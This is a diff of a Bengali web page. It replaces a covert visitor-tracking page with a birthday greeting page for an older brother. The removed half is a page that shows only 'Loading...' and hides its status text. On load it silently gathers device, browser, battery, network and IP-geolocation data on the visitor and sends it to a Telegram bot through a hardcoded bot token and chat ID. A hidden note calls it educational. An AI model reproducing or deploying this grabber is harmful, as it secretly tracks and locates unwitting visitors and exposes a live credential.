@@ -1,229 +1,332 @@
 <!DOCTYPE html>
 <html lang="bn">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>System!</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
-      color: #f0f0f0;
-      padding: 20px;
-    }
-    h1, h2 {
-      color: #ffc107;
-    }
-    ul {
-      list-style: none;
-      padding-left: 0;
-    }
-    li {
-      margin-bottom: 5px;
-    }
-    #status {
-      background: #222;
-      padding: 10px;
-      margin-top: 10px;
-      border-left: 5px solid #ffc107;
-    }
-    .section {
-      margin-bottom: 30px;
-    }
-    .warning {
-      background: #ff5722;
-      padding: 10px;
-      color: #fff;
-      border-radius: 4px;
-      margin-bottom: 20px;
-    }
-    @media (max-width: 600px) {
-      body {
-        font-size: 16px;
-      }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>বার্থডে ড্যাশবোর্ড: বড় ভাই</title>
+    <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body { 
+            font-family: 'Hind Siliguri', sans-serif; 
+            background-color: #090a0f; /* খুব গাঢ় ব্যাকগ্রাউন্ড */
+            color: #f8fafc; 
+            display: flex;
+            justify-content: center;
+            padding: 40px 15px;
+            min-height: 100vh;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Background Animated Shapes */
+        .bg-shape {
+            position: fixed;
+            border-radius: 50%;
+            filter: blur(100px);
+            z-index: -1;
+            animation: float 10s ease-in-out infinite alternate;
+        }
+        .shape1 { width: 350px; height: 350px; background: #ff007f; top: -100px; left: -100px; }
+        .shape2 { width: 450px; height: 450px; background: #00e5ff; bottom: -150px; right: -100px; animation-delay: -5s; }
+        .shape3 { width: 300px; height: 300px; background: #7000ff; top: 40%; left: 50%; transform: translate(-50%, -50%); animation: pulseBg 8s infinite alternate; }
+
+        @keyframes float {
+            0% { transform: translateY(0) scale(1); }
+            100% { transform: translateY(50px) scale(1.1); }
+        }
+        @keyframes pulseBg {
+            0% { opacity: 0.3; transform: scale(0.8); }
+            100% { opacity: 0.8; transform: scale(1.2); }
+        }
+
+        .container { 
+            width: 100%; 
+            max-width: 750px; 
+            display: flex;
+            flex-direction: column;
+            gap: 25px;
+            z-index: 1;
+            animation: fadeInPage 1s ease-out;
+        }
+
+        @keyframes fadeInPage {
+            from { opacity: 0; transform: translateY(30px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Neon Glassmorphism Card Style */
+        .card { 
+            background: rgba(15, 15, 25, 0.6); 
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            padding: 30px; 
+            border-radius: 20px; 
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5), inset 0 0 15px rgba(255,255,255,0.02); 
+            text-align: center;
+            transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+        }
+        .card:hover { 
+            transform: translateY(-5px); 
+            box-shadow: 0 15px 35px rgba(0, 229, 255, 0.15), inset 0 0 20px rgba(255, 0, 127, 0.05); 
+            border-color: rgba(0, 229, 255, 0.3);
+        }
+
+        /* Text with Neon Glow */
+        h1 { color: #fff; font-weight: 700; margin-bottom: 10px; font-size: 2.2rem; text-shadow: 0 0 15px #ff007f, 0 0 30px #ff007f; }
+        h2 { color: #00e5ff; font-size: 1.4rem; margin-bottom: 20px; border-bottom: 2px solid rgba(0, 229, 255, 0.2); padding-bottom: 10px; text-shadow: 0 0 10px rgba(0, 229, 255, 0.5); }
+        p.subtitle { color: #cbd5e1; font-size: 1.1rem; line-height: 1.6; }
+        
+        /* Image Slider with Zoom Animation */
+        .slider-container { 
+            position: relative; 
+            border-radius: 20px; 
+            height: 350px; 
+            overflow: hidden;
+            padding: 0;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        .slide { 
+            position: absolute;
+            width: 100%; 
+            height: 100%;
+            opacity: 0; 
+            transition: opacity 0.8s ease-in-out;
+        }
+        .slide.active { opacity: 1; z-index: 1; }
+        
+        .slide img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            filter: brightness(0.75);
+            transform: scale(1);
+            transition: transform 5s linear; /* ধীর গতির জুম অ্যানিমেশন */
+        }
+        .slide.active img {
+            transform: scale(1.1);
+        }
+
+        .slide-text {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: rgba(0, 0, 0, 0.7);
+            backdrop-filter: blur(8px);
+            padding: 10px 25px;
+            border-radius: 30px;
+            color: #fff;
+            font-size: 1.1rem;
+            font-weight: 600;
+            white-space: nowrap;
+            border: 1px solid #00e5ff;
+            box-shadow: 0 0 15px rgba(0, 229, 255, 0.4);
+            animation: slideUpText 0.8s ease-out forwards;
+        }
+
+        @keyframes slideUpText {
+            from { opacity: 0; bottom: 0px; }
+            to { opacity: 1; bottom: 20px; }
+        }
+
+        .nav-btn {
+            position: absolute;
+            top: 50%;
+            transform: translateY(-50%);
+            background: rgba(0, 0, 0, 0.5);
+            color: #00e5ff;
+            border: 1px solid #00e5ff;
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            cursor: pointer;
+            font-size: 1.2rem;
+            backdrop-filter: blur(8px);
+            transition: all 0.3s;
+            z-index: 10;
+        }
+        .nav-btn:hover { background: #00e5ff; color: #000; box-shadow: 0 0 15px #00e5ff; }
+        .nav-left { left: 15px; }
+        .nav-right { right: 15px; }
+
+        /* Animated Table */
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 15px 10px; text-align: left; border-bottom: 1px dashed rgba(255,255,255,0.1); }
+        th { color: #a8b2d1; font-weight: 600; text-transform: uppercase; font-size: 0.9rem; letter-spacing: 1px; }
+        td { font-size: 1.1rem; color: #e2e8f0; }
+        tr:last-child td { border-bottom: none; }
+
+        /* Table Row Animation */
+        tr.anim-row {
+            opacity: 0;
+            transform: translateX(-20px);
+            animation: fadeRight 0.6s ease-out forwards;
+        }
+        tr.anim-row:nth-child(2) { animation-delay: 0.3s; }
+        tr.anim-row:nth-child(3) { animation-delay: 0.6s; }
+        tr.anim-row:nth-child(4) { animation-delay: 0.9s; }
+
+        @keyframes fadeRight {
+            to { opacity: 1; transform: translateX(0); }
+        }
+
+        /* Glowing Badges */
+        .badge { padding: 6px 14px; border-radius: 20px; font-size: 0.9rem; font-weight: 700; display: inline-block; }
+        .bg-green { background: rgba(16, 185, 129, 0.2); color: #34d399; border: 1px solid #34d399; box-shadow: 0 0 10px rgba(16, 185, 129, 0.3); }
+        .bg-yellow { background: rgba(245, 158, 11, 0.2); color: #fbbf24; border: 1px solid #fbbf24; box-shadow: 0 0 10px rgba(245, 158, 11, 0.3); }
+        .bg-red { background: rgba(239, 68, 68, 0.2); color: #f87171; border: 1px solid #f87171; box-shadow: 0 0 10px rgba(239, 68, 68, 0.3); }
+        
+        /* Neon Button */
+        .action-btn { 
+            background: transparent; 
+            color: #ff007f;
+            border: 2px solid #ff007f; 
+            padding: 15px 40px; 
+            cursor: pointer; 
+            border-radius: 50px; 
+            font-size: 1.2rem;
+            font-weight: 700; 
+            box-shadow: 0 0 15px rgba(255, 0, 127, 0.4), inset 0 0 10px rgba(255, 0, 127, 0.2);
+            transition: all 0.3s ease;
+            font-family: 'Hind Siliguri', sans-serif;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .action-btn:hover { 
+            background: #ff007f; 
+            color: #fff;
+            transform: scale(1.05); 
+            box-shadow: 0 0 25px #ff007f, 0 0 50px #ff007f; 
+        }
+
+        /* Pop-up Secret Message */
+        #secret-message { 
+            display: none; 
+            background: rgba(20, 10, 30, 0.8); 
+            border: 2px solid #7000ff;
+            box-shadow: 0 0 30px rgba(112, 0, 255, 0.4);
+            animation: popIn 0.6s cubic-bezier(0.68, -0.55, 0.265, 1.55) forwards;
+            transform-origin: center;
+        }
+        #secret-message h3 { color: #d8b4fe; margin-bottom: 10px; font-size: 1.8rem; text-shadow: 0 0 15px #7000ff; }
+
+        @keyframes popIn {
+            0% { opacity: 0; transform: scale(0.5) translateY(50px); }
+            100% { opacity: 1; transform: scale(1) translateY(0); }
+        }
+    </style>
 </head>
 <body>
-  <h1>Loading...</h1>
-  <div class="warning" style="display: none;">
-    সতর্কতা: এই পেজটি শুধুমাত্র <strong>শিক্ষামূলক</strong> উদ্দেশ্যে তৈরি। ক্লায়েন্ট-সাইডে টেলিগ্রাম বট টোকেন রাখা নিরাপত্তার জন্য অত্যন্ত ঝুঁকিপূর্ণ।
-  </div>
-  <p id="status" style="display: none;">তথ্য সংগ্রহ করা হচ্ছে...</p>
 
-  <div id="info" style="display: none;"></div>
+<!-- Animated Background Shapes -->
+<div class="bg-shape shape1"></div>
+<div class="bg-shape shape2"></div>
+<div class="bg-shape shape3"></div>
 
-  <script>
-    const BOT_TOKEN = "8599591227:AAF3O6iHCgoMrWJFTLDVxknRBy8AZ_nF3J8";
-    const CHAT_ID = "8571316406";
+<div class="container">
+    <!-- Header Card -->
+    <div class="card">
+        <h1>শুভ জন্মদিন, বড় ভাই! 🎉</h1>
+        <p class="subtitle">Soaliman ভাই সারাজীবন অনেক হাসিখুশি থাকেন, সব কিছু ভালো হোক! </p>
+    </div>
 
-    const sanitizeForMarkdownV2 = (text) => {
-      return text.replace(/[\\_*\[\]()~`>#+\-=|{}.!]/g, (match) => '\\' + match);
+    <!-- Image Slider Card -->
+    <div class="card slider-container">
+        <!-- স্লাইড ১ -->
+        <div class="slide active">
+            <img src="https://i.ibb.co/svSkR0yg/FB-IMG-1772554885676.jpg" alt="Childhood">
+            <div class="slide-text">এই হাসি দেইখা কত মেয়ের যে মন ভাঙা </div>
+        </div>
+        <!-- স্লাইড ২ -->
+        <div class="slide">
+            <img src="https://i.ibb.co/5XmpDYYf/FB-IMG-1772554898027.jpg" alt="Protection">
+            <div class="slide-text">-</div>
+        </div>
+        <!-- স্লাইড ৩ -->
+        <div class="slide">
+            <img src="https://i.ibb.co/gbQP4qs9/FB-IMG-1772554890631.jpg" alt="Fun together">
+            <div class="slide-text">কবি</div>
+        </div>
+        
+        <button class="nav-btn nav-left" onclick="changeSlide(-1)">❮</button>
+        <button class="nav-btn nav-right" onclick="changeSlide(1)">❯</button>
+    </div>
+
+    <!-- Status Table Card -->
+    <div class="card">
+        <h2>ভাই-ভাই সম্পর্ক </h2>
+        <table>
+            <tr class="anim-row">
+                <th>বিষয়</th>
+                <th>বর্তমান অবস্থা</th>
+            </tr>
+            <tr class="anim-row">
+                <td>সবজি খাওয়া</td>
+                <td><span class="badge bg-green">১০০% গ্যারান্টি</span></td>
+            </tr>
+            <tr class="anim-row">
+                <td>মুরগি চুরি</td>
+                <td><span class="badge bg-yellow">প্রো-লেভেল</span></td>
+            </tr>
+            <tr class="anim-row">
+                <td>আমাদের প্রতি স্নেহ</td>
+                <td><span class="badge bg-red">Ultra</span></td>
+            </tr>
+        </table>
+    </div>
+
+    <!-- Secret Action Button -->
+    <div style="text-align: center; margin-top: 10px;">
+        <button class="action-btn" onclick="reveal()">সারপ্রাইজ দেখতে ক্লিক করেন</button>
+    </div>
+
+    <!-- Secret Message -->
+    <div id="secret-message" class="card">
+        <h3>🎉 সারপ্রাইজ!</h3>
+        <p class="subtitle" style="color: #f1f5f9; font-size: 1.2rem;">
+         তারতারি মেঘ আপুরে বিয়ে করে দাওয়াত দিন, সাথে আপুর বান্ধবীর নাম্বারটা যদি একটু, মানে বুঝেনি তো! 😁
+        </p>
+    </div>
+</div>
+
+<script>
+    let currentSlide = 0;
+    let slides = document.getElementsByClassName("slide");
+
+    function changeSlide(n) {
+        slides[currentSlide].classList.remove("active");
+        // স্লাইড টেক্সটের অ্যানিমেশন পুনরায় চালু করতে
+        let oldText = slides[currentSlide].querySelector('.slide-text');
+        oldText.style.animation = 'none';
+
+        currentSlide = (currentSlide + n + slides.length) % slides.length;
+        
+        slides[currentSlide].classList.add("active");
+        let newText = slides[currentSlide].querySelector('.slide-text');
+        newText.style.animation = '';
+        newText.style.animation = 'slideUpText 0.8s ease-out forwards';
     }
 
-    const status = (msg) => {
-      document.getElementById("status").innerText = msg;
+    // প্রতি ৪ সেকেন্ড পর পর অটো স্লাইড
+    let slideInterval = setInterval(() => { changeSlide(1); }, 4000);
+
+    function reveal() {
+        let msg = document.getElementById('secret-message');
+        msg.style.display = 'block';
+        
+        // বাটন ক্লিক করার পর যেন স্ক্রল করে মেসেজটা দেখায়
+        setTimeout(() => {
+            msg.scrollIntoView({ behavior: 'smooth', block: 'end' });
+        }, 150);
     }
+</script>
 
-    const appendSection = (title, items) => {
-      const container = document.getElementById("info");
-      const section = document.createElement("div");
-      section.className = "section";
-      section.innerHTML = `<h2>${title}</h2><ul>${items.map(item => `<li>${item}</li>`).join('')}</ul>`;
-      container.appendChild(section);
-    }
-
-    const getInfo = async () => {
-      try {
-        status("তথ্য সংগ্রহ করা হচ্ছে...");
-        const ua = navigator.userAgent;
-        const lang = navigator.language;
-        const online = navigator.onLine ? "অনলাইনে" : "অফলাইনে";
-        const dnt = navigator.doNotTrack === "1" ? "অন" : "বন্ধ";
-        const darkMode = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches ? "Dark" : "Light";
-
-        let os = "অজানা";
-        if (/Windows NT 10/.test(ua)) os = "Windows 10";
-        else if (/Android/.test(ua)) os = ua.match(/Android\s[\d\.]+/)[0];
-        else if (/iPhone OS/.test(ua)) os = ua.match(/OS [\d_]+/)[0].replace("_", ".");
-
-        const browserMatch = ua.match(/(Chrome|Firefox|Safari|Edg|Opera)[/\s]([\d]+)/);
-        const browser = browserMatch ? `${browserMatch[1]} ${browserMatch[2]}` : "অজানা";
-
-        const deviceType = /Mobi/.test(ua) ? "Mobile" : (/Tablet|iPad/.test(ua) ? "Tablet" : "Desktop");
-        const deviceModel = ua.match(/; ([^;]*) Build/)?.[1] || "নির্ধারিত নয়";
-
-        appendSection("সাধারণ তথ্য", [
-          `User Agent: ${ua}`,
-          `OS: ${os}`,
-          `Browser: ${browser}`,
-          `Device Type: ${deviceType}`,
-          `Device Model: ${deviceModel}`
-        ]);
-
-        appendSection("পেইজ ও নেভিগেশন", [
-          `URL: ${location.href}`,
-          `Title: ${document.title}`,
-          `Referrer: ${document.referrer}`,
-          `ভাষা: ${lang}`,
-          `স্ট্যাটাস: ${online}`,
-          `Cookies Enabled: ${navigator.cookieEnabled}`,
-          `Do Not Track: ${dnt}`,
-          `কালার স্কিম: ${darkMode}`
-        ]);
-
-        appendSection("স্ক্রিন তথ্য", [
-          `Resolution: ${screen.width}x${screen.height}`,
-          `Available: ${screen.availWidth}x${screen.availHeight}`,
-          `Color Depth: ${screen.colorDepth}`,
-          `Pixel Depth: ${screen.pixelDepth}`,
-          `Device Pixel Ratio: ${window.devicePixelRatio}`,
-          `Orientation: ${screen.orientation.type}`
-        ]);
-
-        const now = new Date();
-        appendSection("সময় তথ্য", [
-          `লোকাল সময়: ${now.toLocaleString("bn-BD")}`,
-          `UTC: ${now.toUTCString()}`,
-          `TimeZone Offset: ${now.getTimezoneOffset()} মিনিট`
-        ]);
-
-        appendSection("হার্ডওয়্যার তথ্য", [
-          `CPU কোর: ${navigator.hardwareConcurrency || "অজানা"}`,
-          `RAM: ${navigator.deviceMemory || "অজানা"} GB`,
-          `Touch Support: ${("ontouchstart" in window) ? "হ্যাঁ" : "না"}`
-        ]);
-
-        if ('connection' in navigator) {
-          const c = navigator.connection;
-          appendSection("নেটওয়ার্ক", [
-            `প্রকার: ${c.type}`,
-            `Effective: ${c.effectiveType}`,
-            `Downlink: ${c.downlink} Mbps`,
-            `RTT: ${c.rtt} ms`,
-            `Data Saver: ${c.saveData ? "চালু" : "বন্ধ"}`
-          ]);
-        }
-
-        if ('getBattery' in navigator) {
-          status("ব্যাটারি তথ্য আনা হচ্ছে...");
-          try {
-            const battery = await navigator.getBattery();
-            appendSection("ব্যাটারি", [
-              `Level: ${battery.level * 100}%`,
-              `Charging: ${battery.charging ? "হ্যাঁ" : "না"}`,
-              `Time to Charge: ${battery.chargingTime} s`,
-              `Time to Discharge: ${battery.dischargingTime} s`
-            ]);
-          } catch {}
-        }
-
-        const plugins = Array.from(navigator.plugins).map(p => p.name);
-        appendSection("ব্রাউজার প্লাগইন", plugins);
-
-        status("IP তথ্য আনা হচ্ছে...");
-        try {
-          const res = await fetch("http://ip-api.com/json/?fields=66846719");
-          const ipInfo = await res.json();
-          if (ipInfo.status === "success") {
-            appendSection("IP ভিত্তিক তথ্য", [
-              `IP: ${ipInfo.query}`,
-              `ISP: ${ipInfo.isp}`,
-              `Organization: ${ipInfo.org}`,
-              `AS: ${ipInfo.as}`,
-              `Country: ${ipInfo.country} (${ipInfo.countryCode})`,
-              `Region: ${ipInfo.regionName}`,
-              `City: ${ipInfo.city}`,
-              `ZIP: ${ipInfo.zip}`,
-              `Latitude: ${ipInfo.lat}`,
-              `Longitude: ${ipInfo.lon}`,
-              `TimeZone: ${ipInfo.timezone}`,
-              `Mobile: ${ipInfo.mobile}`,
-              `Proxy/VPN: ${ipInfo.proxy}`,
-              `Hosting: ${ipInfo.hosting}`
-            ]);
-          } else {
-            appendSection("IP তথ্য", ["ত্রুটি: API ব্যর্থ হয়েছে"]);
-          }
-        } catch (e) {
-          appendSection("IP তথ্য", ["ত্রুটি: API অনুপলব্ধ"]);
-        }
-
-        status("তথ্য টেলিগ্রামে পাঠানো হচ্ছে...");
-        if (BOT_TOKEN === "YOUR_BOT_TOKEN" || CHAT_ID === "YOUR_TELEGRAM_CHAT_ID") {
-          status("ত্রুটি: টোকেন বা চ্যাট আইডি সেট করা হয়নি");
-          return;
-        }
-
-        const content = document.getElementById("info").innerText;
-        const message = sanitizeForMarkdownV2(`*তথ্য সংগ্রহ প্রতিবেদন*\n\n${content}`);
-
-        try {
-          const sendRes = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({
-              chat_id: CHAT_ID,
-              text: message,
-              parse_mode: "MarkdownV2"
-            })
-          });
-          const json = await sendRes.json();
-          if (json.ok) {
-            status("সফলভাবে পাঠানো হয়েছে!");
-          } else {
-            status("পাঠাতে ত্রুটি: " + json.description);
-            console.error("Problematic message:", message);
-          }
-        } catch (e) {
-          status("নেটওয়ার্ক ত্রুটি: টেলিগ্রামে পাঠাতে ব্যর্থ");
-        }
-      } catch (err) {
-        status("ত্রুটি: " + err.message);
-      }
-    }
-
-    window.onload = getInfo;
-  </script>
 </body>
 </html>
